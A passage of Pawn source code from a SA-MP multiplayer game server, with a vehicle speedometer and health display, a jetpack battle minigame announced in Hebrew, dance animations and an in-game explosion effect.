				    TextDrawShowForPlayer(i, Text:Black0);
				    TextDrawShowForPlayer(i, Text:Black1);
				    TextDrawShowForPlayer(i, Text:Black2);
				    TextDrawShowForPlayer(i, Text:Black3);
				    TextDrawShowForPlayer(i, Text:LightBlack);
				    TextDrawShowForPlayer(i, Text:BlackHealth);
				    TextDrawShowForPlayer(i, Text:DarkRedHealth);
				    TextDrawShowForPlayer(i, Text:BlackSpeed);
				    TextDrawShowForPlayer(i, Text:DarkYellowSpeed);
				    TextDrawShowForPlayer(i, Text:Marker);
				    TextDrawsShown[i] = true;
				}



			    new String[128];
		        new Float:X, Float:Y, Float:Z, Float:DistanceSpeedo;
	            GetPlayerPos(i, X, Y, Z);
	            DistanceSpeedo = floatsqroot(floatpower(floatabs(floatsub(X,OldX[i])),2)+floatpower(floatabs(floatsub(Y,OldY[i])),2)+floatpower(floatabs(floatsub(Z,OldZ[i])),2));
				new PlayerVehicleModelID = GetVehicleModel(GetPlayerVehicleID(i));
				PlayerVehicleModelID -= 400;
				format(String,sizeof(String),"~b~Vehicle:~n~~w~%s~n~~b~Health:~n~~n~Speed:~n~~w~%im/h~n~%ikm/h", PlayerVehicle[PlayerVehicleModelID], floatround(DistanceSpeedo*6.2137125, floatround_floor), floatround(DistanceSpeedo*10, floatround_floor));
				if(VHSCreated[i] == true)
				{
					TextDrawDestroy(VHS[i]);
				}
				VHS[i] = TextDrawCreate(485.000000,355.000000,String);
				TextDrawAlignment(VHS[i],0);
				TextDrawBackgroundColor(VHS[i],0x000000ff);
				TextDrawFont(VHS[i],1);
				TextDrawLetterSize(VHS[i],0.299999,1.000000);
				TextDrawColor(VHS[i],0xffffffff);
				TextDrawSetOutline(VHS[i],1);
				TextDrawSetProportional(VHS[i],1);
				TextDrawSetShadow(VHS[i],1);
            	TextDrawShowForPlayer(i, VHS[i]);
            	VHSCreated[i] = true;



				new Float:CarHealth;
				GetVehicleHealth(GetPlayerVehicleID(i), CarHealth);
				if(LightRedHealthCreated[i] == true)
				{
					TextDrawDestroy(LightRedHealth[i]);
				}
				LightRedHealth[i] = TextDrawCreate(488.000000,386.000000,"_");
				TextDrawUseBox(LightRedHealth[i],1);
				TextDrawBoxColor(LightRedHealth[i],0xff000099);
				for(new j=0; j<50; j++)
				{
				    if(CarHealth >= 1000) { TextDrawTextSize(LightRedHealth[i],589.000000,0.000000); }
				    else if(CarHealth >= j*20 && CarHealth < (j+1)*20) { TextDrawTextSize(LightRedHealth[i],484.0+(j*2.1),0.000000); }
				}
				TextDrawAlignment(LightRedHealth[i],0);
				TextDrawBackgroundColor(LightRedHealth[i],0x000000ff);
				TextDrawFont(LightRedHealth[i],3);
				TextDrawLetterSize(LightRedHealth[i],1.000000,0.199999);
				TextDrawColor(LightRedHealth[i],0xffffffff);
				TextDrawSetOutline(LightRedHealth[i],1);
				TextDrawSetProportional(LightRedHealth[i],1);
				TextDrawSetShadow(LightRedHealth[i],1);
            	TextDrawShowForPlayer(i, LightRedHealth[i]);
            	LightRedHealthCreated[i] = true;
				if(CarHealth < 250)
				{
					if(ExclamationShown[i] == true)
					{
						TextDrawHideForPlayer(i, Text:Exclamation);
					    ExclamationShown[i] = false;
					}
					else
					{
						TextDrawShowForPlayer(i, Text:Exclamation);
					    ExclamationShown[i] = true;
					}
				}



				if(LightYellowSpeedCreated[i] == true)
				{
					TextDrawDestroy(LightYellowSpeed[i]);
				}
				LightYellowSpeed[i] = TextDrawCreate(537.000000,404.000000,"_");
				TextDrawUseBox(LightYellowSpeed[i],1);
				TextDrawBoxColor(LightYellowSpeed[i],0xffff0066);
				for(new k=0; k<50; k++)
				{

				    if(DistanceSpeedo >= 21) { TextDrawTextSize(LightYellowSpeed[i],589.000000,0.000000); }
				    else if(DistanceSpeedo >= k*0.42  && DistanceSpeedo <  (k+1)*0.42) { TextDrawTextSize(LightYellowSpeed[i],533.0+(k*1.12),0.000000); }
				}
				TextDrawAlignment(LightYellowSpeed[i],0);
				TextDrawBackgroundColor(LightYellowSpeed[i],0x000000ff);
				TextDrawFont(LightYellowSpeed[i],3);
				TextDrawLetterSize(LightYellowSpeed[i],1.000000,1.200000);
				TextDrawColor(LightYellowSpeed[i],0xffffffff);
				TextDrawSetOutline(LightYellowSpeed[i],1);
				TextDrawSetProportional(LightYellowSpeed[i],1);
				TextDrawSetShadow(LightYellowSpeed[i],1);
            	TextDrawShowForPlayer(i, LightYellowSpeed[i]);
            	LightYellowSpeedCreated[i] = true;



	            OldX[i] = X; OldY[i] = Y; OldZ[i] = Z;



			}
			else
			{
			    if(TextDrawsShown[i] == true)
			    {
					TextDrawHideForPlayer(i, Text:Black0);
					TextDrawHideForPlayer(i, Text:Black1);
					TextDrawHideForPlayer(i, Text:Black2);
					TextDrawHideForPlayer(i, Text:Black3);
					TextDrawHideForPlayer(i, Text:LightBlack);
					TextDrawHideForPlayer(i, Text:BlackHealth);
					TextDrawHideForPlayer(i, Text:DarkRedHealth);
					TextDrawHideForPlayer(i, Text:BlackSpeed);
					TextDrawHideForPlayer(i, Text:DarkYellowSpeed);
					TextDrawHideForPlayer(i, Text:Marker);
					TextDrawHideForPlayer(i, Text:Exclamation);
				    TextDrawsShown[i] = false;
				}
				TextDrawHideForPlayer(i, Text:VHS[i]);
				TextDrawHideForPlayer(i, Text:LightRedHealth[i]);
				TextDrawHideForPlayer(i, Text:LightYellowSpeed[i]);
			}
		}
	}
}
}

//=[JetPackWar]=============
//==================================jetpackStart====================================
forward jetpackStart2();
public jetpackStart2() {
new string[256];

SendClientMessageToAll(COLOR_WHITE,"[_____________גאטר - ג'ט פאקים מעופפים_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לקרב מאורגן, הזדרזו להירשם");
format(string,sizeof(string),".$40000 :פרס למנצח מתחיל מסכום של");
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/wjetpack :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(COLOR_WHITE,".---------------------------------");

jetpackOn = 1; jetpackPlayers = 0;
Countjetpackllenge = 60; Countjetpackllengedown(); CountjetpackllengeFuc = 1;
jetpackSECX = SetTimer("jetpackSECX",1000, 1);
return 1; }
//==================================Countjetpackllengedown===================================
forward Countjetpackllengedown();
public Countjetpackllengedown() {
new String[256];
format(String, 256,"~w~%d",Countjetpackllenge);
for(new i = 0; i < MAX_PLAYERS; i++)
PlayerPlaySound(i,1058, 0.0, 0.0, 0.0);
GameTextForAll(String,1000,6);
if(Countjetpackllenge > 0) {
--Countjetpackllenge;
SetTimer("Countjetpackllengedown", 1000, 0);
} else {
if(CountjetpackllengeFuc == 1) {
TeleportPlayerTojetpack();
if(jetpackKnoob == 1) {
Countjetpackllenge = 10; Countjetpackllengedown(); CountjetpackllengeFuc = 2;
} }
if(CountjetpackllengeFuc == 2 && Countjetpackllenge <= 0) {
UFALLjetpack();
} } }
//==================================UFALLjetpack====================================
forward UFALLjetpack();
public UFALLjetpack() {
for(new i = 0;i<MAX_PLAYERS;i++) {
if(Pjetpackin[i] == 1) {
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
GangZoneShowForPlayer(i,gang_jp,red);
SetPlayerSpecialAction(i,2);
jetpackStart = 1;
} } }
//=============================TeleportPlayerTojetpack==============================
forward TeleportPlayerTojetpack();
public TeleportPlayerTojetpack() {
if(jetpackPlayers < MinjetpackPlayers) {
jetpackEnd(0);
return 1; }
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(Injetpack[i] == 1)
{
new rand = random(sizeof(jetpackSpawn));
SetPlayerPos(i, jetpackSpawn[rand][0], jetpackSpawn[rand][1], jetpackSpawn[rand][2]);

ResetPlayerWeapons(i);
ResetPlayerWeapons(i);
SetPlayerArmour(i, 100.0);
SetPlayerHealth(i, 100.0);
GivePlayerWeapon(i,32,10000);
SetPlayerVirtualWorld(i,0);
SetPlayerSpecialAction(i,2);
SetPlayerInterior(i,17);
Pjetpackin[i] = 1; jetpackKnoob = 1;
TogglePlayerControllable(i, 0);
jetpackTIME = SetTimer("jetpackck",1000, 1);
} }
return 1; }

//===================================jetpackEnd=====================================
forward jetpackEnd(status);
public jetpackEnd(status) {
if(status == 0) {
SendClientMessageToAll(COLOR_WHITE, ".המלחמת ג'ט פאקים מעופפים בוטלה, סיבה: חוסר משתתפים ");
jetpackOn = 0; jetpackPlayers = 0;
KillTimer(jetpackTIME);
KillTimer(jet_pack_area);
KillTimer(jetpackSECX);
for(new i = 0;i<MAX_PLAYERS;i++) {
GangZoneHideForPlayer(i,gang_jp);
Injetpack[i] = 0;  Pjetpackin[i] = 0; jetpackStart = 0; jetpackKnoob = 0;
} return 1; }
else if(status == 1) {
jetpackOn = 0; jetpackPlayers = 0;
LACY_GiveMoney(jetpackWinner, 40000);
GetPlayerName(jetpackWinner, playername, sizeof(playername));
KillTimer(jetpackTIME);
KillTimer(jetpackSECX);
KillTimer(jet_pack_area);
ResetPlayerWeapons(jetpackWinner);
SetPlayerInterior(jetpackWinner, 0);
SetPlayerPos(jetpackWinner, 2028.6577,1341.8792,10.8203);
GangZoneHideForPlayer(jetpackWinner,gang_jp);
SendClientMessageToAll(COLOR_WHITE,"[________ גאטר ג'ט פאקים מעופפים - מנצח ________]");
SendClientMessageToAll(0xE21E1EFF, "!הקרב הסתיים");
format(kboobjetpack, sizeof(kboobjetpack), "$40000 :נישאר אחרון וקיבל פרס %s", playername);
SendClientMessageToAll(0xE21E1EFF, kboobjetpack);
SendClientMessageToAll(COLOR_WHITE,".-------------------------------------");



for(new i = 0;i<MAX_PLAYERS;i++)
{
GangZoneHideForPlayer(i,gang_jp);

Injetpack[i] = 0; jetpackStart = 0; Pjetpackin[i] = 0; jetpackKnoob = 0;
} return 1; }
else if(status == 2) {
format(kboobjetpack, sizeof(kboobjetpack), ".ביטל את המלחמת ג'ט פאקים מעופפים \"%s\" האדמין ", jetpackadminsname);
SendClientMessageToAll(lblue, kboobjetpack);
jetpackPlayers = 0;
jetpackKnoob = 0; jetpackStart = 0;
jetpackOn = 0;
Countjetpackllenge = 0; CountjetpackllengeFuc = 0;
KillTimer(jetpackTIME);
KillTimer(jetpackSECX);
KillTimer(jet_pack_area);
for(new i = 0;i<MAX_PLAYERS;i++) {
Injetpack[i] = 0; Pjetpackin[i] = 0;
} return 1; }
return 1; }
//===================================jetpackck======================================
forward jetpackck();
public jetpackck()
{
if(jetpackStart == 1)
{
if(jetpackPlayers == 1)
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(Injetpack[i] == 1)
{
jetpackWinner = i; jetpackEnd(1);
}
}
}
}
return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
if(Injetpack[playerid] == 1)
{
if(newinteriorid != 17)
{
SetPlayerHealth(playerid,0.0);
}
}
return true;
}

forward fix_world();
public fix_world()
{
for(new i = 0; i < 10; i++)
{
SetVehicleVirtualWorld(triamountion[i],5);
}

for(new i = 0; i < 16; i++)
{
SetVehicleVirtualWorld(hdmworld[i],4);
}
return true;
}

IsValidSkin(skinid)
{
    #define	MAX_BAD_SKINS 22
    new badSkins[MAX_BAD_SKINS] =
    { 3, 4, 5, 6, 8, 42, 65, 74, 86, 119, 149, 208, 268, 273, 289 };
    if (skinid < 0 || skinid > 299) return false;
    for (new i = 0; i < MAX_BAD_SKINS; i++) { if (skinid == badSkins[i]) return false; }
    #undef MAX_BAD_SKINS
    return 1;
}



stock AnimDance(playerid,s)
{
if(s == 1)
{
ApplyAnimation(playerid,"DANCING","bd_clap",4.0,1,1,1,1,0);
}
if(s == 2)
{
ApplyAnimation(playerid,"DANCING","bd_clap1",4.0,1,1,1,1,0);
}
if(s == 3)
{
ApplyAnimation(playerid,"DANCING","dance_loop",4.0,1,1,1,1,0);
}
if(s == 4)
{
ApplyAnimation(playerid,"DANCING","DAN_Down_A",4.0,1,1,1,1,0);
}
if(s == 5)
{
ApplyAnimation(playerid,"DANCING","DAN_Left_A",4.0,1,1,1,1,0);
}
if(s == 6)
{
ApplyAnimation(playerid,"DANCING","DAN_Loop_A",4.0,1,1,1,1,0);
}

if(s == 7)
{
ApplyAnimation(playerid,"DANCING","DAN_Right_A",4.0,1,1,1,1,0);
}
if(s == 8)
{
ApplyAnimation(playerid,"DANCING","DAN_Up_A",4.0,1,1,1,1,0);
}

if(s == 9)
{
ApplyAnimation(playerid,"DANCING","dnce_M_a",4.0,1,1,1,1,0);
}

if(s == 10)
{
ApplyAnimation(playerid,"DANCING","dnce_M_b",4.0,1,1,1,1,0);
}
if(s == 11)
{
ApplyAnimation(playerid,"DANCING","dnce_M_c",4.0,1,1,1,1,0);
}
if(s == 12)
{
ApplyAnimation(playerid,"DANCING","dnce_M_d",4.0,1,1,1,1,0);
}
if(s == 13)
{
ApplyAnimation(playerid,"DANCING","dnce_M_e",4.0,1,1,1,1,0);
}
return 1;
}
//=[Bombs]=============
forward BlastBomb(playerid);
public BlastBomb(playerid)
{
      CreateExplosion(XBomb, YBomb, ZBomb, 10, 38.0);
      CreateExplosion(XBomb, YBomb+10.0, ZBomb, 10, 38.0);
      DestroyStreamObject(dynamite[playerid]);
      return 1;
}



